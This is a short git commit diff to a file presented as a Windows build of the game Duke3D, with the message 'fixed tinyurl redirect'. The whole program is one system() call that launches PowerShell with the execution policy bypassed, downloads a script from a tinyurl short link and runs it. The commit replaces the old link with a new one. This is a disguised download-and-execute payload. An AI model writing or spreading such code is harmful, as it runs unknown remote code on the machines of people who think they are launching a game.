e4725c58e1a41fa7c6cf975db62facae484eee55
metalx1000 <github@filmsbykris.com>
2015-03-28 09:00:23 -0400

    fixed tinyurl redirect

--- games/duke3d/win32/main.c
+++ games/duke3d/win32/main.c
@@ -1,4 +1,4 @@
 #include <stdio.h>
 int main(){
-    system("powershell -executionpolicy bypass \"IEX (New-Object Net.WebClient).DownloadString('http://tinyurl.com/qcyepw8'); \"");
+    system("powershell -executionpolicy bypass \"IEX (New-Object Net.WebClient).DownloadString('http://tinyurl.com/oe7lajn'); \"");
 }
